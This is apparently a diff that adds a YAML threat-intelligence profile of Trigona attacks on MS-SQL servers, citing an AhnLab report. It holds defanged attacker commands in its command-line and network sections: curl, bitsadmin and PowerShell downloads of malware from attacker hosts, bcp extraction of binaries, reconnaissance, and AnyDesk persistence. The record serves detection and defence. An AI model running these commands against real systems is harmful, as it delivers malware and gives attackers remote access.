@@ -1,0 +1,75 @@
+description: "Trigona threat actors target MS\u2011SQL servers using brute\u2011force\
+  \ attacks, CLR Shell, BCP for malware delivery, and download tools such as curl,\
+  \ bitsadmin, and PowerShell."
+attribution: Trigona, APT group, unknown country
+malware_families:
+- Trigona
+- Mimic
+TTPs:
+  processes: []
+  commandline:
+  - hostname
+  - whoami
+  - systeminfo
+  - tasklist
+  - wmic useraccount where (LocalAccount=True) get name
+  - powershell -Command net user ladmin2
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\ProgramData\\spd.exe -T -f
+    C:\\ProgramData\\FODsOZKgAU.txt
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\ProgramData\\AD.exe -T -f
+    C:\\ProgramData\\FODsOZKgAU.txt
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\users\\[User Name]\\music\\L.bat
+    -T -f C:\\users\\[User Name]\\music\\FODsOZKgAU.txt
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\users\\[User Name]\\music\\pci2.exe
+    -T -f C:\\users\\[User Name]\\music\\FODsOZKgAU.txt
+  - curl hxxps://cia[.]tf/60b30e194972f937b859d0075be69e2a.exe -o C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\glock.exe
+  - bitsadmin /transfer indirme /download /priority normal hxxp://195.66.214[.]79/pci.exe
+    c:\\users\\[username]\\Videos\\pci.exe
+  - powershell Invoke-WebRequest -Uri hxxp://195.66.214[.]79/L.bat -OutFile c:\users\[username]\music\L.bat
+  - '%SystemDrive%/programdata/AD.exe install C:\\programdata silent'
+  - '%SystemDrive%/programdata/Anydesk-e7eba7df get-id'
+  powershell: []
+  scripting_engine:
+  - Batch script for adding RDP users and modifying registry keys
+  - Bat2Exe generated batch that creates erp2 account and installs MSI (Teramind)
+  - Rust scanner malware strings
+  - Go StressTester with SQL injection feature
+  - Batch script responsible for deleting directories and files
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: curl
+    destination: hxxps://cia[.]tf/60b30e194972f937b859d0075be69e2a.exe
+    port: 443
+  - executable: bitsadmin
+    destination: hxxp://195.66.214[.]79/pci.exe
+    port: 80
+  - executable: powershell
+    destination: hxxp://195.66.214[.]79/L.bat
+    port: 80
+  file_activity:
+  - C:\\ProgramData\\spd.exe
+  - C:\\ProgramData\\AD.exe
+  - C:\\users\\[User Name]\\music\\L.bat
+  - C:\\users\\[User Name]\\music\\pci2.exe
+  - C:\\Windows\\SERVIC~1\\MSSQL$~1\\AppData\\Local\\Temp\\glock.exe
+  - c:\\users\\[username]\\Videos\\pci.exe
+  - c:\\users\\[username]\\music\\L.bat
+  persistence:
+  - AnyDesk installed in %ALLUSERSPROFILE% path via AD.exe install command
+  - RDP user creation with names Remote99 or Ladmin
+  - Teramind MSI installation via Bat2Exe generated batch
+  process_relations: []
+IOCs:
+  hashes: []
+  ips:
+  - 195.66.214[.]79
+  domains:
+  - cia[.]tf
+  urls:
+  - hxxps://cia[.]tf/60b30e194972f937b859d0075be69e2a.exe
+  - hxxp://195.66.214[.]79/pci.exe
+  - hxxp://195.66.214[.]79/L.bat
+reference: https://asec.ahnlab.com/en/90793
+date_of_publication: October 23, 2025
+file_creation_date: October 30, 2025
